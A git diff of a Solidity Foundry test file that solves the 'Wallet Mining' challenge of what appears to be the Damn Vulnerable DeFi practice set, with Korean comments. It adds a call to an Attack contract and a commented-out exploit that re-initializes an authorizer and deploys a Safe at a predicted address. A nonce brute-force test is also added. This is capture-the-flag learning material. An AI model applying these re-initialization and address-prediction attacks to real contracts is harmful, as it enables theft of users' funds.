@@ -24,6 +24,7 @@ import {
     SAFE_SINGLETON_FACTORY_ADDRESS,
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
+import {Attack} from "./Attack.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -89,18 +90,22 @@ contract WalletMiningChallenge is Test {
                 initCode: type(AuthorizerFactory).creationCode
             })
         );
+        // authorizer 프록시로 배포
+        // 구현체를 교체하는 것이 가능한지? => upgrader가 아니면 구현체 교체 불가
         authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));
 
         // Send big bag full of DVT tokens to the deposit address
         token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);
 
         // Call singleton factory to deploy copy and factory contracts
+        // safe 구현체 배포
         (bool success, bytes memory returndata) =
             address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
         singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));
 
         (success, returndata) =
             address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
+        // safe 프록시 팩토리 배포
         proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));
 
         // Deploy wallet deployer
@@ -118,7 +123,7 @@ contract WalletMiningChallenge is Test {
         walletDeployer.rule(address(authorizer));
 
         // Fund wallet deployer with initial tokens
-        initialWalletDeployerTokenBalance = walletDeployer.pay();
+        initialWalletDeployerTokenBalance = walletDeployer.pay(); // 1 DVT
         token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);
 
         vm.stopPrank();
@@ -157,7 +162,122 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
+        Attack attack = new Attack(player, user, address(authorizer), address(walletDeployer), address(token), ward, userPrivateKey);
         
+        // Safe safeWallet = Safe(payable(USER_DEPOSIT_ADDRESS));
+        // // 1. WalletDeployer에서 1DVT 획득
+        // // AuthorizerUpgradeable의 wards[player][USER_DEPOSIT_ADDRESS]를 1로 등록
+        // address[] memory wards = new address[](1);
+        // wards[0] = player;
+
+        // address[] memory aims = new address[](1);
+        // aims[0] = USER_DEPOSIT_ADDRESS;
+
+        // authorizer.init(wards, aims);
+
+        // // deploy safe wallet initializer
+        // uint256 saltNonce = 13;
+        // address[] memory owners = new address[](1);
+        // owners[0] = user;
+
+        // bytes memory initializer = abi.encodeCall(
+        //     Safe.setup,
+        //     (
+        //         owners,              // [user]
+        //         1,                   // threshold 1-of-1
+        //         address(0),          // to
+        //         "",                  // data
+        //         address(0),          // fallbackHandler
+        //         address(0),          // paymentToken
+        //         0,                   // payment
+        //         payable(address(0))  // paymentReceiver
+        //     )
+        // );
+
+        // // WalletDeplyer에서 drop 호출하여 1DVT 획득과 동시에 safe wallet 배포
+        // walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, saltNonce);
+
+        // // 1DVT ward에게 전송
+        // token.transfer(ward, initialWalletDeployerTokenBalance);
+
+        // // 2. 2000만 DVT 회수하기
+        // // call execTransaction to get back 2000만 DVT to user
+
+        // // Safe 지갑이 실행할 내용 : 2000만 DVT를 user에게 전송하는 calldata
+        // bytes memory transferDVTtoUser = abi.encodeCall(
+        //     token.transfer,
+        //     (user, DEPOSIT_TOKEN_AMOUNT)
+        // );
+
+        // // user(=Safe owner)가 서명할 tx hash
+        // uint256 nonce = safeWallet.nonce();
+        // bytes32 txHash = safeWallet.getTransactionHash(
+        //     address(token),        // DVT 주소
+        //     0,                  // no ether
+        //     transferDVTtoUser,   // DVT.transfer(user, DEPOSIT_TOKEN_AMOUNT)
+        //     Enum.Operation.Call,
+        //     0,
+        //     0,
+        //     0,
+        //     address(0),
+        //     payable(address(0)),
+        //     nonce
+        // );
+
+        // // user(=Safe owner)가 tx hash에 서명
+        // (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        // bytes memory signature = abi.encodePacked(r, s, v);
+
+
+        // // player가 user의 서명을 사용하여 execTransaction 호출
+        // safeWallet.execTransaction(
+        //     address(token),
+        //     0,
+        //     transferDVTtoUser,
+        //     Enum.Operation.Call,
+        //     0,
+        //     0,
+        //     0,
+        //     address(0),
+        //     payable(address(0)),
+        //     signature
+        // );
+    }
+
+    function test_guessNonce() public {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (
+                owners,              // [user]
+                1,                   // threshold 1-of-1
+                address(0),          // to
+                "",                  // data
+                address(0),          // fallbackHandler
+                address(0),          // paymentToken
+                0,                   // payment
+                payable(address(0))  // paymentReceiver
+            )
+        );
+
+        bytes32 initCodeHash = keccak256(abi.encodePacked(
+            type(SafeProxy).creationCode,
+            uint256(uint160(address(singletonCopy)))
+        ));
+
+        for (uint256 nonce = 0; nonce < 100_000; nonce++){
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
+            address predicted = vm.computeCreate2Address(salt, initCodeHash, address(proxyFactory));
+
+            if (predicted == USER_DEPOSIT_ADDRESS){
+                console.log("nonce found", nonce);
+                return;
+            }
+        }
+        revert("nonce not found");
+
     }
 
     /**
